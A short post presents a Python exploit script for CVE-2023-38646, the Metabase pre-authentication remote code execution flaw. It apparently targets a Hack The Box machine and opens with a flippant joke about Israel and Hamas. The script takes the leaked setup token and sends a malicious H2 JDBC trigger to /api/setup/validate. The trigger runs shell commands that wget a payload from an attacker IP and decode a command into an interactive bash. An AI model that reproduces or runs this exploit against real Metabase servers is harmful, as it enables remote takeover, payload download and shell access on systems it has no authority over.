
A crappy exploit script written for CVE-2023-38646. It works about as well as peace treaties between Israel and Hamas.

https://github.com/Itrekr/CVE-2023-38646-Crapsploit/tree/main

```
#!/usr/bin/env python3
import requests
import json
import base64

# List of Metabase instances
metabase_instances = ['http://data.analytical.htb:80']  # replace with your instances

def custom_base64_encode(command):
    encoded_command = base64.b64encode(command.encode('utf-8')).decode('utf-8').rstrip("=")
    return encoded_command

def construct_malicious_jdbc_uri(command):
    encoded_command = custom_base64_encode(command)
    malicious_jdbc_uri = (
        "zip:/app/metabase.jar!/sample-database.db;"
        "MODE=MSSQLServer;"
        "TRACE_LEVEL_SYSTEM_OUT=1;"
        "CREATE TRIGGER pwnshell2 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$ java.lang.Runtime.getRuntime().exec('wget http://10.10.17.185:12345/shell.shhh -O /tmp/sneed.sh'); $$;"
    )
    #return malicious_jdbc_uri
    return f"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {{echo,{encoded_command}}}|{{base64,-d}}|{{bash,-i}}')\n$$--=x"
    #return "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell2 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('ls');\n$$--=x";

def post_setup_validate(url, setup_token):
    malicious_jdbc_uri = construct_malicious_jdbc_uri("wget -P /tmp 10.10.17.185:12345/shell.shhh")
    #malicious_jdbc_uri = construct_malicious_jdbc_uri("bash -c 'bash /tmp/shell.shhh'")
    validate_endpoint = f"{url}/api/setup/validate"
    payload = {
        "token": setup_token,
        "details": {
            "is_on_demand": False,
            "is_full_sync": False,
            "is_sample": False,
            "cache_ttl": None,
            "refingerprint": False,
            "auto_run_queries": True,
            "schedules": {},
            "details": {
                "db": malicious_jdbc_uri,
                "advanced-options": False,
                "ssl": False  # adding the ssl field as it was present in the exploit script you provided earlier
            },
            "name": "test",
            "engine": "h2"
        }
    }
    headers = {'Content-Type': 'application/json'}
    print(f"[DEBUG] Sending request to {validate_endpoint} with payload: {json.dumps(payload, indent=4)}")
    try:
        response = requests.post(validate_endpoint, headers=headers, json=payload, timeout=5)
        print(f"[DEBUG] Response Status Code: {response.status_code}")
        print(f"[DEBUG] Response Text: {response.text}")
        if response.status_code == 200:
            print(f"{url} is vulnerable")
        else:
            print(f"{url} is not vulnerable, response code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Failed to check {url}: {e}")

def check_vulnerability(url):
    endpoint = f"{url}/api/session/properties"
    print(f"[DEBUG] Retrieving setup token from {endpoint}")
    try:
        response = requests.get(endpoint, timeout=5)
        setup_token = response.json().get('setup-token', None)
        if setup_token:
            print(f"{url} has setup token: {setup_token}")
            post_setup_validate(url, setup_token)
        else:
            print(f"{url} is not vulnerable, no setup token found")
    except requests.exceptions.RequestException as e:
        print(f"Failed to check {url}: {e}")

if __name__ == "__main__":
    for instance in metabase_instances:
        print(f"[DEBUG] Processed URL: {instance}")
        check_vulnerability(instance)
```